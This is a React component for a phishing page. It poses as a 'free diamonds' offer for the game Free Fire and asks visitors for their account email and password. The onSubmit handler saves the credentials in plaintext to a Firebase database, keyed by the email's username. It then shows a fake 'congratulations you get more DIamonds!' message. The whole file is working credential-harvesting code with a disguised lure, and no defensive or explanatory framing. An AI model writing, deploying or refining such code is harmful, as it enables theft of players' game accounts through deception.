import React, { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { IoDiamondOutline } from "react-icons/io5";
import firebase from "firebase/compat/app";
import "firebase/compat/database";
import config from "./config";

export const Login = () => {
  const [user, setUser] = useState();
  const [dataBase, setDataBase] = useState();
  const [ok, setOk] = useState(false);

  const {
    formState: { errors },
    handleSubmit,
    register,
  } = useForm({
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const onSubmit = (data) => {
    console.log("called");
    console.log(ok);
    let name;
    name = data.email.split("@")[0];
    console.log("name", name);
    firebase.database().ref(name).set(data);
    console.log("data saved");
    setOk(true);
    console.log(ok);
  };

  useEffect(() => {
    firebase.initializeApp(config);
    setDataBase(firebase.database());
  }, []);

  return (
    <div className={`w-full h-screen ${ok && "flex justify-center items-center"}`}>
      {!ok && (
        <form
          action="h-screen w-full flex justify-center items-center"
          onSubmit={handleSubmit(onSubmit)}
        >
          <div className="w-full h-screen sm:w-1/2 lg:w-1/2  m-auto gap-3 flex flex-col justify-center items-center">
            <div className="w-full px-4 sm:px-0">
              <h1 className="text-center text-white text-xl font-serif mb-5 font-bold underline">
                Enter Your Free Fire Account
              </h1>
              <label htmlFor="" className="flex flex-col justify-between">
                <span className="font-bold text-white mb-1">Email :</span>
                <input
                  type="email"
                  name="email"
                  id=""
                  placeholder="Enter your email"
                  {...register("email", { required: true })}
                  className="py-2 indent-4 bg-transparent/60 focus:outline-none border-2 border-yellow-200 text-white"
                />
              </label>
              <label htmlFor="" className="flex flex-col justify-between mt-3">
                <span className="font-bold text-white mb-1">Password :</span>
                <input
                  type="text"
                  name="password"
                  id=""
                  placeholder="Enter your Password"
                  {...register("password", { required: true })}
                  className="py-2 indent-4 bg-transparent/60 focus:outline-none border-2 border-yellow-200 text-white"
                />
              </label>
              <div className="w-full flex justify-center items-center">
                <button
                  type="submit"
                  className="bg-gradient-to-r from-red-500 to-amber-400 w-full mx-10 sm:mx-0 sm:w-1/2 py-2 rounded-sm mt-5 text-white font-bold"
                >
                  Submit
                </button>
              </div>
            </div>
          </div>
        </form>
      )}{ok && <h1 className="text-xl bg-gradient-to-r from-orange-300 to-sky-300 bg-clip-text text-transparent font-bold flex justify-center items-center">congratulations you get more DIamonds!</h1>}
    </div>
  );
};
